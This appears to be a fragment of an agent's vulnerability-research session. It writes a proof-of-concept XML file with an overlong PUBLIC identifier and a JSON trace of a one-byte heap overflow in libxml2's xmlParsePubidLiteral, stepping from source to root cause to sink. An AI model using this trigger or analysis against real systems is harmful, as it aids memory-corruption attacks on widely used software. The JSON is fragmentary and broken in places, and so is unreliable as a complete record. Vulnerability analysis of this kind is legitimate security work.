from pathlib import Path
pub='A'*101
p=Path('/workspace/poc.xml')
p.write_bytes(f'<!DOCTYPE a PUBLIC "{pub}" "x"><a/>'.encode())
print(p, p.stat().st_size)
print(p.read_text()[:140])
PY
cat > /workspace/analysis.json <<'JSON'

      "line": 4436,
      "var": "cur",
      "code": "cur = CUR;",
      "role": "source",
      "note": "The current byte of the PUBLIC identifier is read from the XML input, allowing the input to control how many PubidChar bytes are appended."
    },
    {
      "step": 2,
      "file": "parser.c",
      "function": "xmlParsePubidLiteral",
      "line": 4449,
      "var": "tmp",
      "code": "tmp = xmlRealloc(buf, size);",
      "role": "root_cause",
      "note": "When len reaches the capacity boundary, newSize has been computed larger than size, but the reallocation still uses the old size, so the real heap allocation is not grown to the capacity later recorded in size."
    },
    {
      "step": 3,
      "file": "parser.c",
      "function": "xmlParsePubidLiteral",
      "line": 4456,
      "var": "size",
      "code": "size = newSize;",
      "role": "intermediate",
      "note": "The parser records the larger newSize as the buffer capacity even though xmlRealloc was called with the old size."
    },
    {
      "step": 4,
      "file": "parser.c",
      "function": "xmlParsePubidLiteral",
      "line": 4458,
      "var": "buf[len++]",
      "code": "buf[len++] = cur;",
      "role": "sink",
      "note": "Further input-controlled public identifier bytes are written according to the inflated size value, causing a one-byte heap write past the old allocation."
    }
  ],
  "vuln_logic": {
    "source": {
      "file": "parser.c",
      "function": "xmlParsePubidLiteral",
      "line": 4436,
      "operands": ["CUR", "cur"]

      "line": 4449,
      "operands": ["size", "newSize", "xmlRealloc(buf, size)"],
      "relation": {"op": "ge", "left": "size", "right": "newSize"}
    },
    "sink": {

      "function": "xmlParsePubidLiteral",
      "line": 4458,
      "operands": ["buf[len++]", "cur", "size"],
      "relation": {"op": "lt", "left": "len", "right": "size"}
    },
    "propagation": [
      {

        "to": {"file": "parser.c", "function": "xmlParsePubidLiteral", "line": 4458, "operands": ["buf[len++]", "cur"]},
        "type": "data",

      },

        "to": {"file": "parser.c", "function": "xmlParsePubidLiteral", "line": 4458, "operands": ["buf[len++]", "size"]},
        "type": "control",
